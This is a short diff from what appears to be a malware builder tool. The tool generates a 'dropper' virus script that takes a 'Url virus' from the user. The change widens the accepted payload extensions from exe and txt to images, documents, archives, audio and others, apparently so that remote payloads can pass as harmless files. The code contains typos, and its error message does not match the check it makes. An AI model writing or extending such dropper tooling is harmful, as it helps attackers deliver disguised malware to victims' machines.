@@ -77,7 +77,7 @@ class Run:
 				self.filenampackeg = "dropperviurs.py"
 				self.urlvirus = self.colored_input("set Url virus : " , spaces=8)
 				ended = "exe","txt"
-				if not self.urlvirus.endswith(("exe","txt")):
+				if not self.urlvirus.endswith(("exe","txt","png","jpeg","link","sp1","bat",".zip","tar","rar","doc","docx","pdf","mp3","mp4","svg","ppt","pptx","gif")):
 					print(f"{R}	[X] {WI}Your link must end with the extension (.exe or .jpeg or .txt) and so on {G}")
 					exit(0)
 				mido.getdatefromuser_bin()
